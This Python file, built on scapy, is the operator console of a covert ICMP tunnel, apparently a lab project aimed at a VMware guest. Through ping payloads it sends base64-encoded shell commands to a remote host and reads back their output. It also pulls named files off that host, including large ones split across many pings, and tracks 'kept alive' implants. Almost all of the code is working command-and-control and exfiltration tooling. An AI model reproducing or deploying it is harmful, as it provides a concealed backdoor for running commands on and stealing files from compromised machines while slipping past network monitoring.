from scapy.all import *
from threading import Thread
import base64
import subprocess
import time

sniffInterface = "VMware Network Adapter VMnet8"
destination = "192.168.18.129"
keptAliveClients = dict() # Map
maxKeepAlive = 30


def keepAlive():
    while(True):
        #print("[KeepAlive] Kept alive clients : " + str(keptAliveClients)+"\n")
        a = sniff(iface=sniffInterface, filter="icmp", count=1)
        receivedMessage = a[0][3].fields.get("load").decode("utf-8")
        if receivedMessage == "keepAlive":
            src = a[0][1].fields.get("src")
            #print("[KeepAlive] Added to kept alive "+src+"\n")
            keptAliveClients[src] = time.time()

def trimKeptAlive():
    while True:
        time.sleep(maxKeepAlive)
        #print("[KeepAliveTrim] Trimming kept alive clients ...\n")
        now = time.time()
        duplicateClients = dict(keptAliveClients)
        for key in duplicateClients:
            if now - keptAliveClients[key] >= maxKeepAlive:
                #print("[KeepAliveTrim] Deleting "+key+" from kept alive...\n")
                del keptAliveClients[key]
        

# @return ICMP message's bytes
def sniffMessage():
    while(True):
        a = sniff(iface=sniffInterface, filter="icmp", count=1)

        # 8 is echo-request and only listen for those
        if a[0][2].fields.get("type") == 8:
            return a[0][3].fields.get("load")


# Send echo-reply
def sendMessage(destination, string):
    p = sr1(IP(dst=destination)/ICMP(type=0, id=1, seq=1)/string, timeout=0)


if __name__ == "__main__":
    keepAliveThread = Thread(target = keepAlive)
    keepAliveThread.start()

    trimkeepAliveThread = Thread(target = trimKeptAlive)
    trimkeepAliveThread.start()
    
    while True:

        action = input("What should we do ? file | command | message ? ")
        sendMessage(destination, action)

        print("Selected action : "+action)

        if action == "file":

            fileName = input("Which file should we get ?\n")
            sendMessage(destination, fileName)
            
            base64File = sniffMessage()

            print("fileName : "+fileName)
            print("base64File : "+base64File.decode("utf-8"))
            with open(fileName, "wb") as fh:
                fh.write(base64.decodebytes(base64File))

        elif action == "bigfile":
            icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=4)        
            fileName = icmpReceived[0][3].fields.get("load").decode("utf-8")
            numberOfPingsToReceive = icmpReceived[2][3].fields.get("load").decode("utf-8")
            numberOfPingsToReceive = int(numberOfPingsToReceive)
            print(f'Number of pings to receive: {numberOfPingsToReceive}')
            print(f'Filename: {fileName}')
            data = b''
            base64File = b''
            pingCounter = 0
            errorFlag = False

            icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=numberOfPingsToReceive*2)
            for ping in icmpReceived:
                data = ping[3].fields.get("load")
                base64File += data
                print(data.decode('utf-8'))


            while data.decode("utf-8") == "zob":
                print(f'Receiving part {str(pingCounter)}')
                icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=2)
                try:
                    data = icmpReceived[0][3].fields.get("load")
                except:
                    errorFlag = True
                    print("ERROR IN RECEIVE")
                #print("data="+data.decode("utf-8"))
                if data.decode("utf-8") != "bigfileSTOP":
                    base64File += data
                else:
                    print('Received bigfileSTOP')
                pingCounter = pingCounter + 1
            
            if errorFlag:
                print("Error in receive, file may be corrupted")
            print(f'Number of pings received: {str(pingCounter)}')
            print("fileName : "+fileName)
            #print("base64File : "+base64File.decode("utf-8"))
            with open(fileName, "wb") as fh:
                fh.write(base64.decodebytes(base64File))

            print(f'File {fileName} received')

        elif action == "command":
            
            command = input("What command should we run ? ")
            encodedCommand = base64.b64encode(command.encode('utf-8'))

            # Protocole : type d'envoi (file/message)
            sendMessage(destination, encodedCommand)

            base64Output = sniffMessage().decode("utf-8")
            print("base64Output: "+base64Output)
            print(base64.b64decode(base64Output))

        elif action == "message":
            message = input("What message should we send ? ")
            sendMessage(destination, message)

            
        elif action != "keepAlive":
            print("Received unknown message "+action)







